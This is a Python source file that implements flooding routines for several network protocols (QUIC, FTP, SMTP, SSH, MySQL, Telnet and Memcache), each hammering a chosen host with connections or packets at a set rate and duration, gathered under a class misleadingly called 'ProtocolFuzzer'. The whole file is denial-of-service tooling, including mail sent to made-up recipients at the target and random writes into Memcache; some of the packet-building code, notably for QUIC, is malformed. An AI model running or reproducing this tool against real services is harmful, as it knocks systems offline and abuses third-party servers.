#!/usr/bin/env python3
import socket
import ssl
import time
import random
import threading
import struct
from typing import Optional, Dict, Any, Callable


class QUICProtocol:
    def __init__(self, host: str, port: int = 443, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None

    def create_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.timeout)
        return sock

    def build_quic_initial_packet(self, dest_conn_id: bytes, src_conn_id: bytes, token: bytes = b"") -> bytes:
        version = b"\x00\x00\x00\x01"
        var_len_src_conn_id = bytes([len(src_conn_id)]) + src_conn_id
        var_len_dest_conn_id = bytes([len(dest_conn_id)]) + dest_conn_id

        header_form = b"\xc0"
        first_byte = header_form + version

        packet_number = random.randint(0, 2**16 - 1)
        pn_length = random.randint(1, 4)
        pn_bytes = packet_number.to_bytes(pn_length, "big")

        crypto_frame = b"\x06" + struct.pack("!H", 0) + struct.pack("!H", 128) + os.urandom(128)

        payload = crypto_frame
        payload_length = len(payload) + pn_length

        header = first_byte + var_len_dest_conn_id + var_len_src_conn_id + bytes([pn_length])

        length = len(payload) + pn_length

        packet = header + pn_bytes + payload
        return packet

    def flood(self, duration: int = 60, rate: int = 1000, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            try:
                sock = self.create_socket()
                dest_conn_id = os.urandom(8)
                src_conn_id = os.urandom(8)
                packet = self.build_quic_initial_packet(dest_conn_id, src_conn_id)
                sock.sendto(packet, (self.host, self.port))
                sock.close()
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)
            except Exception:
                pass

        return sent


class FTProtocol:
    def __init__(self, host: str, port: int = 21, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def anonymous_login(self) -> tuple:
        sock = self.create_socket()
        sock.connect((self.host, self.port))
        resp = sock.recv(1024).decode("utf-8", errors="ignore")

        sock.send(f"USER anonymous\r\n".encode())
        resp = sock.recv(1024).decode("utf-8", errors="ignore")

        sock.send(f"PASS anonymous@example.com\r\n".encode())
        resp = sock.recv(1024).decode("utf-8", errors="ignore")

        return sock, resp

    def flood(self, duration: int = 60, rate: int = 100, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            try:
                sock, resp = self.anonymous_login()
                sock.send(b"NOOP\r\n")
                sock.recv(1024)
                sock.send(b"QUIT\r\n")
                sock.close()
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)
            except Exception:
                pass

        return sent


class SMTPProtocol:
    def __init__(self, host: str, port: int = 25, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def connect_and_helo(self) -> tuple:
        sock = self.create_socket()
        sock.connect((self.host, self.port))
        resp = sock.recv(1024).decode("utf-8", errors="ignore")

        sock.send(f"EHLO {socket.gethostname()}\r\n".encode())
        resp = sock.recv(1024).decode("utf-8", errors="ignore")

        return sock, resp

    def flood(self, duration: int = 60, rate: int = 100, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            try:
                sock, resp = self.connect_and_helo()

                from_addr = f"test{random.randint(1000, 9999)}@example.com"
                to_addr = f"target{random.randint(1000, 9999)}@{self.host}"

                sock.send(f"MAIL FROM:<{from_addr}>\r\n".encode())
                sock.recv(1024)

                sock.send(f"RCPT TO:<{to_addr}>\r\n".encode())
                sock.recv(1024)

                sock.send(f"DATA\r\n".encode())
                sock.recv(1024)

                body = ".".join([f"X-Padding: {random.randint(0, 999999)}" for _ in range(10)])
                sock.send(f"{body}\r\n.\r\n".encode())
                sock.recv(1024)

                sock.send(b"QUIT\r\n")
                sock.close()
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)
            except Exception:
                pass

        return sent


class SSHProtocol:
    def __init__(self, host: str, port: int = 22, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def connect_flood(self, duration: int = 60, rate: int = 50, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            try:
                sock = self.create_socket()
                sock.connect((self.host, self.port))

                version_string = b"SSH-2.0-Test_1.0\r\n"
                sock.send(version_string)

                try:
                    sock.recv(1024)
                except:
                    pass

                sock.close()
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)
            except Exception:
                pass

        return sent


class MySQLProtocol:
    def __init__(self, host: str, port: int = 3306, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def connect_handshake(self) -> tuple:
        sock = self.create_socket()
        sock.connect((self.host, self.port))

        resp = sock.recv(1024)

        handshake_packet = bytearray(resp)
        if len(handshake_packet) < 5:
            sock.close()
            return None, None

        protocol_version = handshake_packet[0]
        server_version = handshake_packet[1:].split(b"\x00")[0].decode("utf-8", errors="ignore")

        thread_id = struct.unpack("<I", os.urandom(4))[0]
        scramble = os.urandom(20)

        auth_packet = bytearray()
        auth_packet.append(20)
        auth_packet.extend(scramble)
        auth_packet.extend(b"\x00" * 32)

        sock.send(bytes(auth_packet))

        try:
            resp = sock.recv(1024)
        except:
            pass

        return sock, protocol_version

    def flood(self, duration: int = 60, rate: int = 50, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            try:
                sock, _ = self.connect_handshake()
                if sock:
                    sock.close()
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)
            except Exception:
                pass

        return sent


class TelnetProtocol:
    def __init__(self, host: str, port: int = 23, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def connect_and_negotiate(self) -> bool:
        try:
            sock = self.create_socket()
            sock.connect((self.host, self.port))

            sock.send(b"\xff\xfb\x01")
            sock.send(b"\xff\xfb\x03")
            sock.send(b"\xff\xfd\x01")

            try:
                sock.recv(1024)
            except:
                pass

            sock.send(b"whoami\r\n")
            try:
                sock.recv(1024)
            except:
                pass

            sock.close()
            return True
        except Exception:
            return False

    def flood(self, duration: int = 60, rate: int = 50, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            if self.connect_and_negotiate():
                sent += 1

            if rate > 0:
                time.sleep(1.0 / rate)

        return sent


class MemcacheProtocol:
    def __init__(self, host: str, port: int = 11211, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def set_command(self) -> bool:
        try:
            sock = self.create_socket()
            sock.connect((self.host, self.port))

            key = f"key_{random.randint(1, 10000)}"
            value = os.urandom(100)

            cmd = f"set {key} 0 0 {len(value)}\r\n".encode()
            sock.send(cmd)
            sock.send(value + b"\r\n")

            try:
                resp = sock.recv(1024)
            except:
                pass

            sock.close()
            return True
        except Exception:
            return False

    def flood(self, duration: int = 60, rate: int = 100, stop_event: threading.Event = None):
        sent = 0
        start = time.time()

        while time.time() - start < duration and (stop_event is None or not stop_event.is_set()):
            if self.set_command():
                sent += 1

            if rate > 0:
                time.sleep(1.0 / rate)

        return sent


import os


class ProtocolFuzzer:
    PROTOCOLS = {
        "quic": QUICProtocol,
        "ftp": FTProtocol,
        "smtp": SMTPProtocol,
        "ssh": SSHProtocol,
        "mysql": MySQLProtocol,
        "telnet": TelnetProtocol,
        "memcache": MemcacheProtocol,
    }

    @staticmethod
    def get_protocol(name: str) -> Optional[Callable]:
        return ProtocolFuzzer.PROTOCOLS.get(name.lower())

    @staticmethod
    def list_protocols() -> list:
        return list(ProtocolFuzzer.PROTOCOLS.keys())
